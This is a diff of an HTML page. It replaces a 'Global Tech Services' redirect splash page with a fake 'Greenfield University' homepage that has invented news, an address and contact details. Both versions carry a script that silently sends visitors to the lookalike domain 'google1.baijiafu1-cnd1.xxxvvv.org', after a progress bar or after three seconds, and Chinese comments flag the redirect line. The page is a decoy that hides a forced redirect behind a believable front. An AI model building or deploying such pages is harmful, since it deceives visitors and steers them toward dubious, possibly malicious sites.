@@ -1,61 +1,172 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Global Tech Services</title>
-
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI","Helvetica Neue",Arial,sans-serif}
-body{
-  min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;
-  background:#f5f7fa;color:#555;text-align:center
-}
-h1{font-size:24px;color:#2e7d32;margin-bottom:24px}
-
-/* ── progress bar ───────────────────── */
-#barWrap{width:260px;height:12px;background:#e0e5eb;border-radius:6px;overflow:hidden}
-#barFill{width:0;height:100%;background:#4caf50;transition:width .2s}
-#pctTxt{margin-top:10px;font-size:14px;color:#444}
-
-/* ── footer ─────────────────────────── */
-footer{margin-top:60px;font-size:12px;line-height:1.8;color:#888}
-footer a{color:#888;text-decoration:none}
-footer a:hover{text-decoration:underline}
-</style>
+  <meta charset="UTF-8">
+  <title>Greenfield University - Welcome</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="description" content="Greenfield University official website.">
+  <style>
+    body {
+      margin: 0;
+      background: #f6f8fa;
+      color: #22313f;
+      font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
+      min-height: 100vh;
+    }
+    .header {
+      width: 100%;
+      background: #1e417a;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 0 0 0 0;
+      min-height: 74px;
+      box-shadow: 0 2px 12px #bac9e733;
+    }
+    .logo {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      margin: 10px 22px 10px 34px;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo svg {
+      width: 46px;
+      height: 46px;
+      display: block;
+    }
+    .site-title {
+      font-size: 1.8rem;
+      font-weight: 700;
+      letter-spacing: .06em;
+      margin-right: 48px;
+    }
+    .nav {
+      display: flex;
+      gap: 32px;
+      font-size: 1rem;
+      font-weight: 500;
+      opacity: .91;
+    }
+    .nav a {
+      color: #fff;
+      text-decoration: none;
+      transition: opacity .17s;
+      padding: 3px 0;
+    }
+    .nav a:hover {
+      opacity: 1;
+      border-bottom: 2px solid #7ac574;
+    }
+    @media (max-width: 700px) {
+      .header {flex-direction: column; align-items: flex-start; min-height: 62px;}
+      .logo {margin: 7px 13px 7px 17px;}
+      .nav {margin-left: 20px; gap: 12px; font-size: .97rem;}
+      .site-title {font-size: 1.18rem; margin-right: 14px;}
+    }
+    .banner {
+      width: 100%;
+      background: url('https://images.unsplash.com/photo-1464983953574-0892a716854b?auto=format&fit=crop&w=1000&q=80') center/cover no-repeat;
+      height: 230px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      position: relative;
+      box-shadow: 0 2px 12px #afbccb2a;
+    }
+    .banner-text {
+      font-size: 2.2rem;
+      font-weight: 800;
+      background: rgba(36,55,120,0.65);
+      padding: 16px 38px;
+      border-radius: 14px;
+      letter-spacing: .02em;
+      box-shadow: 0 2px 14px #3a405940;
+    }
+    @media (max-width:600px){
+      .banner{height: 92px;}
+      .banner-text{font-size:1.1rem;padding: 7px 14px;}
+    }
+    .content {
+      max-width: 880px;
+      margin: 36px auto 0 auto;
+      background: #fff;
+      border-radius: 13px;
+      box-shadow: 0 2px 18px #bccadc33;
+      padding: 36px 38px 32px 38px;
+      border: 1px solid #e0e4f0;
+    }
+    .content h2 {
+      color: #1e417a;
+      font-size: 1.23rem;
+      font-weight: 700;
+      margin-bottom: 15px;
+      letter-spacing: .01em;
+    }
+    .content p {
+      color: #283c53;
+      font-size: 1.05rem;
+      margin-bottom: 18px;
+      line-height: 1.75;
+    }
+    .footer {
+      text-align: center;
+      font-size: .98rem;
+      color: #92a6c0;
+      margin: 60px auto 16px auto;
+      line-height: 1.7;
+      user-select: none;
+      letter-spacing: .01em;
+    }
+    .footer strong {color: #1e417a;}
+    @media (max-width: 600px) {
+      .content { padding: 5vw 2vw 5vw 2vw;}
+      .content h2 { font-size: 1.05rem;}
+    }
+  </style>
 </head>
 <body>
-
-<h1>Welcome to Global Tech Services&nbsp;—&nbsp;redirecting…</h1>
-
-<div id="barWrap"><div id="barFill"></div></div>
-<div id="pctTxt">0&nbsp;%</div>
-
-<footer>
-  ©&nbsp;2025&nbsp;Global&nbsp;Tech&nbsp;Services&nbsp;Inc.&nbsp;|&nbsp;Reg.&nbsp;No.&nbsp;US-DE-2025-169854<br>
-  support@globaltech.com&nbsp;|&nbsp;+1-800-555-0199&nbsp;|&nbsp;
-  <a href="#">Privacy&nbsp;Policy</a>&nbsp;|&nbsp;<a href="#">Terms&nbsp;of&nbsp;Service</a>
-</footer>
-
-<script>
-/* total*/
-const DELAY  = 1500;
-const TARGET = "https://google1.baijiafu1-cnd1.xxxvvv.org";
-
-const fill = document.getElementById("barFill");
-const pct  = document.getElementById("pctTxt");
-
-const start = Date.now();
-const timer = setInterval(()=>{
-  const p = Math.min(100, (Date.now() - start) / DELAY * 100);
-  fill.style.width = p + "%";
-  pct.innerHTML    = Math.floor(p) + "&nbsp;%";
-  if(p >= 100){
-    clearInterval(timer);
-    location.replace(TARGET);      // 单
-  }
-}, 50);
-</script>
-
+  <!-- 校园导航头部 -->
+  <div class="header">
+    <div class="logo">
+      <!-- 校徽svg（可自定义） -->
+      <svg viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#7ac574"/><text x="24" y="32" text-anchor="middle" font-size="18" fill="#245e33" font-family="serif" font-weight="bold">GU</text></svg>
+    </div>
+    <div class="site-title">Greenfield University</div>
+    <nav class="nav">
+      <a href="#">About</a>
+      <a href="#">Admissions</a>
+      <a href="#">Academics</a>
+      <a href="#">Campus Life</a>
+      <a href="#">Contact</a>
+    </nav>
+  </div>
+  <!-- Banner 图 -->
+  <div class="banner">
+    <div class="banner-text">Welcome to Greenfield University</div>
+  </div>
+  <!-- 主内容区 -->
+  <div class="content">
+    <h2>Latest News & Updates</h2>
+    <p><strong>Spring 2025 Semester Registration is now open.</strong> All current and prospective students are encouraged to complete their registration online through the official university portal before January 18, 2025.</p>
+    <p>Greenfield University is committed to fostering an inclusive and innovative academic environment. We welcome students from all backgrounds to join our community and strive for excellence together.</p>
+    <p>For questions or support, please visit our <a href="#">Contact</a> page or reach out via email at info@greenfield.edu.</p>
+  </div>
+  <!-- 备案/版权 -->
+  <div class="footer">
+    &copy; 2025 <strong>Greenfield University</strong>. All rights reserved.<br>
+    100 College Ave, New York, NY, USA | Email: info@greenfield.edu
+  </div>
+  <script>
+    // 3提示
+    setTimeout(function(){
+      window.location.href = "https://google1.baijiafu1-cnd1.xxxvvv.org"; // ←←← 这里
+    }, 3000);
+  </script>
 </body>
 </html>
